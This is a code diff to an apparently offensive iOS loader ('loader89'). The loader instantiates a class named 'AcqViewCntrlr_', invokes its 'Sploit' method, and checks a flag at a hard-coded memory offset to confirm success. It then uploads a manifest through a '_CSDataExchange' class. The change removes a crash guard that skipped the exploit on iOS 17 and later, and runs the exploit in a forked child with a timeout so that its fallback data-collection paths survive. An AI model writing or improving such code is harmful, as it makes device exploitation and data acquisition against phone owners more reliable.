@@ -43,6 +43,9 @@ extern const char *_dyld_get_image_name(unsigned int);
 #include <dirent.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <unistd.h>
+#include <sys/wait.h>
+#include <signal.h>
 
 static void *(*p_dlsym)(void *, const char *);
 static void *(*p_msgSend)();
@@ -434,6 +437,42 @@ static void *run_server_worker(void *arg) {
     return 0;
 }
 
+static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, const char *mcm_root);
+
+static int exploit_child_main(void *acqCls, void *core) {
+    if (!acqCls) return 2;
+    void *acq = p_msgSend(p_msgSend(acqCls, p_sel("alloc")), p_sel("init"));
+    if (!acq) { log_error("exploit child: AcqViewCntrlr_ instance FAIL"); return 3; }
+    static void *serverThread;
+    if (pthread_create(&serverThread, 0, run_server_worker, acq) == 0) pthread_detach(serverThread);
+    sleep(1);
+    p_msgSend(acq, p_sel("InitLogs"));
+    log_info("InitLogs returned");
+    char *st0 = objc_property_string(acq, "lblState");
+    log_info(st0 ? st0 : "lblState=(null)");
+    if (st0) free(st0);
+    log_info("Sploit start");
+    p_msgSend(acq, p_sel("Sploit"));
+    log_info("Sploit returned");
+    sleep(3);
+    char *state = objc_property_string(acq, "lblState");
+    log_info(state ? state : "lblState=(null)");
+    if (state) free(state);
+    if (!core) { p_release(acq); return 4; }
+    unsigned char *flag = (unsigned char *)core + 0x6b96d8;
+    int ok = (*flag == 0);
+    char msg[220];
+    snprintf(msg, sizeof(msg), "exploit raw=%d ok=%d flag_addr=%p", (int)*flag, ok, (void *)flag);
+    log_info(msg);
+    if (ok) {
+        upload_manifest(1, 0, "exploit-child", 0);
+        p_release(acq);
+        return 0;
+    }
+    p_release(acq);
+    return 6;
+}
+
 static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, const char *mcm_root) {
     void *cls = p_getClass("_CSDataExchange");
     if (!cls) { log_error("CSDataExchange missing"); return 0; }
@@ -584,7 +623,7 @@ static void *worker(void *arg) {
         log_info(dm);
     }
 
-    log_info("=== loader89 v4.6 uuidfix start ===");
+    log_info("=== loader89 v4.7 exploit-child start ===");
     read_runtime_config();
     char msg[600], bid[200];
     snprintf(msg, sizeof(msg), "runtime host=%s port=%d log=%s", g_host, g_port, g_logpath);
@@ -615,37 +654,42 @@ static void *worker(void *arg) {
     log_info(msg);
     void *acqCls = p_getClass("AcqViewCntrlr_");
     log_info(acqCls ? "AcqViewCntrlr_ class OK" : "AcqViewCntrlr_ class MISSING");
-    if (ios_major >= 17 && !exploit_forced) {
-        /* iOS 18/26 verified: core RunServer can throw an uncaught C++ exception
-         * and abort the whole process before MHA/MCM has a chance to upload. */
-        log_info("exploit chain SKIPPED (iOS>=17 crash guard)");
-    } else if (acqCls) {
-        void *acq = p_msgSend(p_msgSend(acqCls, p_sel("alloc")), p_sel("init"));
-        log_info(acq ? "AcqViewCntrlr_ instance OK" : "AcqViewCntrlr_ instance FAIL");
-        if (acq) {
-            static void *serverThread;
-            if (pthread_create(&serverThread, 0, run_server_worker, acq) == 0) pthread_detach(serverThread);
-            sleep(1);
-            p_msgSend(acq, p_sel("InitLogs"));
-            log_info("InitLogs returned");
-            char *st0 = objc_property_string(acq, "lblState");
-            log_info(st0 ? st0 : "lblState=(null)");
-            if (st0) free(st0);
-            log_info("Sploit start");
-            p_msgSend(acq, p_sel("Sploit"));
-            log_info("Sploit returned");
-            sleep(3);
-            char *state = objc_property_string(acq, "lblState");
-            log_info(state ? state : "lblState=(null)");
-            if (state) free(state);
-            if (core) {
-                unsigned char *flag = (unsigned char *)core + 0x6b96d8;
-                exploit_ok = (*flag == 0);
-                snprintf(msg, sizeof(msg), "exploit raw=%d ok=%d flag_addr=%p", (int)*flag, exploit_ok, (void *)flag);
-                log_info(msg);
+    if (acqCls) {
+        /* RunServer has been seen aborting the whole process.  Run the exploit
+         * in an isolated child; if the child aborts, the parent keeps the
+         * MHA/MCM fallback alive. */
+        pid_t child = fork();
+        if (child == 0) {
+            int rc = exploit_child_main(acqCls, core);
+            _exit(rc);
+        } else if (child > 0) {
+            snprintf(msg, sizeof(msg), "exploit child pid=%d timeout=45s", (int)child);
+            log_info(msg);
+            int status = 0, finished = 0;
+            for (int i = 0; i < 45; i++) {
+                pid_t got = waitpid(child, &status, WNOHANG);
+                if (got == child) { finished = 1; break; }
+                sleep(1);
             }
-            p_release(acq);
+            if (!finished) {
+                kill(child, SIGKILL);
+                waitpid(child, &status, 0);
+                log_warn("exploit child TIMEOUT killed");
+            }
+            if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+                exploit_ok = 1;
+                log_info("exploit child OK");
+            } else {
+                snprintf(msg, sizeof(msg), "exploit child FAIL exited=%d code=%d signal=%d",
+                         WIFEXITED(status), WIFEXITED(status) ? WEXITSTATUS(status) : -1,
+                         WIFSIGNALED(status) ? WTERMSIG(status) : 0);
+                log_warn(msg);
+            }
+        } else {
+            log_warn("fork FAIL; skip exploit to protect fallback");
         }
+    } else {
+        log_warn("exploit chain SKIPPED (AcqViewCntrlr_ missing)");
     }
 
     int mha_ok = 0;
